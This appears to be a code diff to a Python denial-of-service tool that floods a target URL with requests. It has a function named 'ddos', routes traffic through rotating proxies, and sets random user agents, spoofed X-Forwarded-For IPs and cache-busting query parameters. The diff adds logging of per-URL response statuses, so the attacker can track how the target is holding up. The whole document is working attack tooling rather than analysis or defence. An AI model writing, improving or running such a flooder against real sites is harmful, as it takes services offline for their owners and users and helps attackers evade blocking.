@@ -24,11 +24,13 @@ from commons import config_logger, set_limits, load_proxies
 
 STATS = defaultdict(int)
 URL_ERRORS_COUNT = defaultdict(int)
+URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
 
 
 async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str], ignore_response: bool):
     timeout = aiohttp.ClientTimeout(total=timeout)
     logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
+    base_url = url.split('?', 1)[0]
     try:
         if proxy:
             connector = ProxyConnector.from_url(proxy)
@@ -39,16 +41,19 @@ async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, st
 
         async with client_session as session:
             async with session.get(url, ssl=False) as response:
+                URL_STATUS_STATS[base_url][response.status] += 1
                 if not ignore_response:
                     await response.text()
                 if response.status >= HTTPStatus.INTERNAL_SERVER_ERROR:
-                    URL_ERRORS_COUNT[url] += 1
+                    URL_ERRORS_COUNT[base_url] += 1
                 logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)
 
     except Exception as error:
+        error_message = f"Proxy: {proxy} Error: {error}"
         logging.warning('Url: %s Proxy: %s Error: %s', url, proxy, error)
         STATS[f'{type(error)}'] += 1
-        URL_ERRORS_COUNT[url] += 1
+        URL_ERRORS_COUNT[base_url] += 1
+        URL_STATUS_STATS[base_url]['other_error'] += 1
     else:
         STATS['success'] += 1
 
@@ -102,6 +107,14 @@ async def ddos(
         proxy = get_proxy(proxy_iterator)
         headers = make_headers(user_agent, random_xff_ip, custom_headers)
         await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers, ignore_response)
+        log_stats()
+
+
+def log_stats():
+    if sum(STATS.values()) % 1000 == 0:
+        logging.critical(20 * '-')
+        logging.critical(json.dumps(URL_STATUS_STATS, indent=4))
+        logging.critical(20*'-')
 
 
 async def amain(
